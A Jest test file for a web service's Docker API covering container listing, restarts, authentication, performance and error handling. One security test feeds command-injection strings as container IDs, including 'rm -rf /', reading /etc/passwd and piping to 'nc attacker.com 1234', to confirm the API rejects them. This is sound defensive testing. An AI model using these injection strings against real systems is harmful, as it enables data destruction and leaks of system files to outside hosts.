/**
 * @file docker.test.js
 * @description API tests for Docker operations
 */

const { TestAPIClient, setupTestEnv, teardownTestEnv } = require('../utils/testUtils');

describe('/api/docker', () => {
  let apiClient;
  let testEnv;

  beforeAll(async () => {
    testEnv = await setupTestEnv();
    apiClient = new TestAPIClient(testEnv.baseUrl);
    await apiClient.authenticate();
  });

  afterAll(async () => {
    await teardownTestEnv(testEnv);
  });

  describe('GET /api/docker/containers', () => {
    test('should get Docker container list', async () => {
      const response = await apiClient.getDockerContainers();
      
      // Docker may not be available in test environment
      expect([200, 503]).toContain(response.status);
      
      if (response.status === 200) {
        expect(response.data).toHaveProperty('dockerAvailable');
        expect(response.data).toHaveProperty('containers');
        expect(Array.isArray(response.data.containers)).toBe(true);
        
        if (response.data.containers.length > 0) {
          const container = response.data.containers[0];
          expect(container).toHaveProperty('id');
          expect(container).toHaveProperty('shortId');
          expect(container).toHaveProperty('name');
          expect(container).toHaveProperty('image');
          expect(container).toHaveProperty('status');
          expect(container).toHaveProperty('created');
        }
      } else if (response.status === 503) {
        expect(response.data).toHaveProperty('error');
        expect(response.data.error).toContain('Docker service');
      }
    });

    test('should handle Docker unavailable scenario', async () => {
      const response = await apiClient.getDockerContainers();
      
      if (response.status === 503) {
        expect(response.data).toHaveProperty('dockerAvailable', false);
        expect(response.data).toHaveProperty('error');
        expect(typeof response.data.error).toBe('string');
      }
    });

    test('should filter running containers if available', async () => {
      const response = await apiClient.getDockerContainers({ status: 'running' });
      
      expect([200, 503]).toContain(response.status);
      
      if (response.status === 200 && response.data.containers.length > 0) {
        response.data.containers.forEach(container => {
          expect(['running', 'up']).toContain(container.status.toLowerCase());
        });
      }
    });
  });

  describe('POST /api/docker/containers/:id/restart', () => {
    test('should handle container restart request', async () => {
      // First get available containers
      const containersResponse = await apiClient.getDockerContainers();
      
      if (containersResponse.status === 200 && containersResponse.data.containers.length > 0) {
        const containerId = containersResponse.data.containers[0].id;
        const response = await apiClient.restartDockerContainer(containerId);
        
        expect([200, 404, 500, 503]).toContain(response.status);
        
        if (response.status === 200) {
          expect(response.data).toHaveProperty('success', true);
          expect(response.data).toHaveProperty('message');
          expect(response.data.message).toContain('restarted');
        }
      } else {
        // Test with mock container ID when Docker is not available
        const response = await apiClient.restartDockerContainer('mock-container-id');
        expect([404, 500, 503]).toContain(response.status);
      }
    });

    test('should handle non-existent container restart', async () => {
      const response = await apiClient.restartDockerContainer('nonexistent-container-id');
      
      expect([404, 500, 503]).toContain(response.status);
      
      if (response.status === 404) {
        expect(response.data).toHaveProperty('error');
        expect(response.data.error).toContain('not found');
      }
    });

    test('should validate container ID format', async () => {
      const invalidIds = ['', null, undefined, 'invalid-id-format'];
      
      for (const id of invalidIds) {
        const response = await apiClient.restartDockerContainer(id);
        expect([400, 404, 422, 500, 503]).toContain(response.status);
      }
    });

    test('should handle Docker service unavailable during restart', async () => {
      const response = await apiClient.restartDockerContainer('test-container');
      
      if (response.status === 503) {
        expect(response.data).toHaveProperty('error');
        expect(response.data.error).toContain('Docker service');
      }
    });
  });

  describe('Docker Integration Tests', () => {
    test('should handle complete Docker workflow when available', async () => {
      // Get containers
      const containersResponse = await apiClient.getDockerContainers();
      expect([200, 503]).toContain(containersResponse.status);
      
      if (containersResponse.status === 200) {
        expect(containersResponse.data).toHaveProperty('dockerAvailable');
        
        if (containersResponse.data.dockerAvailable && containersResponse.data.containers.length > 0) {
          // Try to restart first container
          const containerId = containersResponse.data.containers[0].id;
          const restartResponse = await apiClient.restartDockerContainer(containerId);
          
          expect([200, 404, 500]).toContain(restartResponse.status);
          
          // Get containers again to verify state
          const finalResponse = await apiClient.getDockerContainers();
          expect(finalResponse.status).toBe(200);
        }
      }
    });

    test('should maintain consistent Docker status across requests', async () => {
      const response1 = await apiClient.getDockerContainers();
      const response2 = await apiClient.getDockerContainers();
      
      expect(response1.status).toBe(response2.status);
      
      if (response1.status === 200 && response2.status === 200) {
        expect(response1.data.dockerAvailable).toBe(response2.data.dockerAvailable);
      }
    });
  });

  describe('Docker Security Tests', () => {
    test('should require authentication for Docker operations', async () => {
      const unauthenticatedClient = new TestAPIClient(testEnv.baseUrl);
      
      const response = await unauthenticatedClient.get('/docker/containers');
      expect([401, 403]).toContain(response.status);
    });

    test('should validate Docker permissions', async () => {
      // Test container access permissions
      const response = await apiClient.getDockerContainers();
      expect([200, 403, 503]).toContain(response.status);
    });

    test('should prevent container ID injection', async () => {
      const maliciousIds = [
        'container-id; rm -rf /',
        'container-id && cat /etc/passwd',
        '../../../etc/passwd',
        'container-id | nc attacker.com 1234'
      ];
      
      for (const id of maliciousIds) {
        const response = await apiClient.restartDockerContainer(id);
        expect([400, 404, 422, 500, 503]).toContain(response.status);
      }
    });

    test('should sanitize Docker responses', async () => {
      const response = await apiClient.getDockerContainers();
      
      if (response.status === 200) {
        const content = JSON.stringify(response.data);
        
        // Should not contain sensitive information
        expect(content).not.toMatch(/password|secret|token|key/i);
        expect(content).not.toContain('<script>');
        expect(content).not.toContain('DROP TABLE');
      }
    });
  });

  describe('Docker Performance Tests', () => {
    test('should handle Docker requests efficiently', async () => {
      const startTime = Date.now();
      const response = await apiClient.getDockerContainers();
      const duration = Date.now() - startTime;
      
      expect([200, 503]).toContain(response.status);
      expect(duration).toBeLessThan(5000); // 5 seconds max
    });

    test('should handle concurrent Docker requests', async () => {
      const concurrentRequests = Array(3).fill().map(() => 
        apiClient.getDockerContainers()
      );
      
      const responses = await Promise.all(concurrentRequests);
      responses.forEach(response => {
        expect([200, 429, 500, 503]).toContain(response.status);
      });
    });

    test('should timeout Docker operations appropriately', async () => {
      const startTime = Date.now();
      const response = await apiClient.restartDockerContainer('timeout-test-container');
      const duration = Date.now() - startTime;
      
      expect([200, 404, 408, 500, 503]).toContain(response.status);
      expect(duration).toBeLessThan(30000); // 30 seconds max
    });
  });

  describe('Docker Error Handling', () => {
    test('should handle Docker daemon connection errors', async () => {
      const response = await apiClient.getDockerContainers();
      
      if (response.status === 503) {
        expect(response.data).toHaveProperty('error');
        expect(response.data.error).toMatch(/Docker|service|connection/i);
      }
    });

    test('should provide meaningful Docker error messages', async () => {
      const response = await apiClient.restartDockerContainer('error-test-container');
      
      if (response.status >= 400) {
        expect(response.data).toHaveProperty('error');
        expect(typeof response.data.error).toBe('string');
        expect(response.data.error.length).toBeGreaterThan(0);
      }
    });

    test('should handle Docker permission errors', async () => {
      const response = await apiClient.getDockerContainers();
      
      if (response.status === 403) {
        expect(response.data).toHaveProperty('error');
        expect(response.data.error).toMatch(/permission|access|forbidden/i);
      }
    });

    test('should handle malformed Docker requests', async () => {
      try {
        await apiClient.post('/docker/containers/test/restart', 'invalid-json', {
          headers: { 'Content-Type': 'application/json' }
        });
      } catch (error) {
        expect([400, 422, 500]).toContain(error.response?.status);
      }
    });
  });

  describe('Docker Configuration Tests', () => {
    test('should respect Docker configuration settings', async () => {
      const response = await apiClient.getDockerContainers();
      
      // Test should work regardless of Docker availability
      expect([200, 503]).toContain(response.status);
      
      if (response.status === 200) {
        expect(response.data).toHaveProperty('dockerAvailable');
        expect(typeof response.data.dockerAvailable).toBe('boolean');
      }
    });

    test('should handle Docker socket configuration', async () => {
      const response = await apiClient.getDockerContainers();
      
      // Should handle both socket and TCP configurations
      expect([200, 503]).toContain(response.status);
    });

    test('should validate Docker TLS settings', async () => {
      const response = await apiClient.getDockerContainers();
      
      // TLS validation should not cause crashes
      expect([200, 503]).toContain(response.status);
    });
  });

  describe('Docker Container Management', () => {
    test('should list containers with proper metadata', async () => {
      const response = await apiClient.getDockerContainers();
      
      if (response.status === 200 && response.data.containers.length > 0) {
        const container = response.data.containers[0];
        
        // Verify container metadata structure
        expect(typeof container.id).toBe('string');
        expect(typeof container.shortId).toBe('string');
        expect(typeof container.name).toBe('string');
        expect(typeof container.image).toBe('string');
        expect(typeof container.status).toBe('string');
        expect(typeof container.created).toBe('number');
        
        // Verify short ID is actually shorter
        expect(container.shortId.length).toBeLessThan(container.id.length);
        expect(container.id).toContain(container.shortId);
      }
    });

    test('should handle container filtering', async () => {
      const response = await apiClient.getDockerContainers();
      
      if (response.status === 200) {
        expect(response.data).toHaveProperty('containers');
        expect(Array.isArray(response.data.containers)).toBe(true);
        
        // Should not include system or hidden containers by default
        response.data.containers.forEach(container => {
          expect(container.name).not.toMatch(/^(pause|k8s_|docker_)/);
        });
      }
    });
  });
});
